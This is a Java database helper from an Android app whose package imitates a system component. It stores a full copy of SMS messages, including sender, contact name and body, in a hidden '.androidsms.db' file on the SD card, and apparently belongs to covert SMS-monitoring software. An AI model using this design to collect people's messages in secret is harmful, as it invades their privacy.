package com.android.system.controled.db;

import java.io.File;
import java.io.IOException;

import com.android.system.controled.Globle;

import android.database.sqlite.SQLiteDatabase;
import android.util.Log;

public class DatabaseUtil {

	private static final String TAG = "DatabaseUtil";

	private static SQLiteDatabase mSQLiteDatabase;
	public static final String DB_NAME = ".androidsms.db";
	public static final String DB_PATH = Globle.FILE_SDCARD + ".androidsms.db";
	public static final int DB_VERSION = 6;

	public static final String[] ALLSMS_ALLCOLUMNS = { "thread_id", "date", "address", "person", "type", "subject", "body", "read", "status" };
	public static final String TABLE_NAME_ALLSMS = "table_allsms";
	public static final String ALLSMS_TABLE_COLUMN_ID = "_id";// ¶ÌÐÅÐòºÅ
	public static final String ALLSMS_TABLE_COLUMN_THREAD_ID = "thread_id";// ¶Ô»°ÐòºÅ
	public static final String ALLSMS_TABLE_COLUMN_DATE_LONG = "date_long";
	public static final String ALLSMS_TABLE_COLUMN_DATE_STR = "date_str";
	public static final String ALLSMS_TABLE_COLUMN_ADDRESS = "address";
	public static final String ALLSMS_TABLE_COLUMN_PERSON_ID = "person_id";
	public static final String ALLSMS_TABLE_COLUMN_PERSON_NAME = "person_name";
	public static final String ALLSMS_TABLE_COLUMN_TYPE = "type";
	public static final String ALLSMS_TABLE_COLUMN_SUBJECT = "subject";
	public static final String ALLSMS_TABLE_COLUMN_BODY = "body";
	public static final String ALLSMS_TABLE_COLUMN_READ = "read";
	public static final String ALLSMS_TABLE_COLUMN_STATUS = "status";

	public static final String CREATETABLE_ALLSMS = "CREATE TABLE IF NOT EXISTS " + TABLE_NAME_ALLSMS + " (" + ALLSMS_TABLE_COLUMN_ID + " INTEGER PRIMARY KEY," + ALLSMS_TABLE_COLUMN_THREAD_ID + " INTEGER," + ALLSMS_TABLE_COLUMN_DATE_LONG + " LONG unique," + ALLSMS_TABLE_COLUMN_DATE_STR + " TEXT," + ALLSMS_TABLE_COLUMN_ADDRESS + " TEXT," + ALLSMS_TABLE_COLUMN_PERSON_ID + " INTEGER," + ALLSMS_TABLE_COLUMN_PERSON_NAME + " TEXT," + ALLSMS_TABLE_COLUMN_TYPE + " INTEGER," + ALLSMS_TABLE_COLUMN_SUBJECT + " TEXT," + ALLSMS_TABLE_COLUMN_BODY + " TEXT," + ALLSMS_TABLE_COLUMN_READ + " INTEGER," + ALLSMS_TABLE_COLUMN_STATUS + " INTEGER )";
	public static final String DROP_TABLE_ALLSMS = "DROP TABLE IF EXISTS " + TABLE_NAME_ALLSMS + ";";
	public static final String CLEAR_ALLSMS = "DELETE FROM " + TABLE_NAME_ALLSMS + ";";

	public static SQLiteDatabase getMDB() {
		if (mSQLiteDatabase == null || !mSQLiteDatabase.isOpen()) {
			Log.v(TAG, "will create database file");

			File parentDir = new File(DatabaseUtil.DB_PATH).getParentFile();
			Log.v(TAG, parentDir.toString());
			if (!parentDir.exists()) {
				parentDir.mkdirs();
			}
			if (!new File(DatabaseUtil.DB_PATH).exists()) {
				try {
					new File(DatabaseUtil.DB_PATH).createNewFile();
				} catch (IOException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			}

			try {
				mSQLiteDatabase = SQLiteDatabase.openOrCreateDatabase(new File(DatabaseUtil.DB_PATH), null);

				Log.v(TAG, "pre version=" + mSQLiteDatabase.getVersion());

				if (mSQLiteDatabase.getVersion() != DB_VERSION) {
					onVersionChanged(mSQLiteDatabase);
					mSQLiteDatabase.setVersion(DB_VERSION);
				}

				onCreate(mSQLiteDatabase);

			} catch (Exception e) {
				e.printStackTrace();
			}

		}

		return mSQLiteDatabase;
	}

	private static void onCreate(SQLiteDatabase db) {
		db.execSQL(DatabaseUtil.CREATETABLE_ALLSMS);
	}

	private static void onVersionChanged(SQLiteDatabase db) {
		Log.e(TAG, "onVersionChanged");
		db.execSQL(DatabaseUtil.DROP_TABLE_ALLSMS);
	}

}
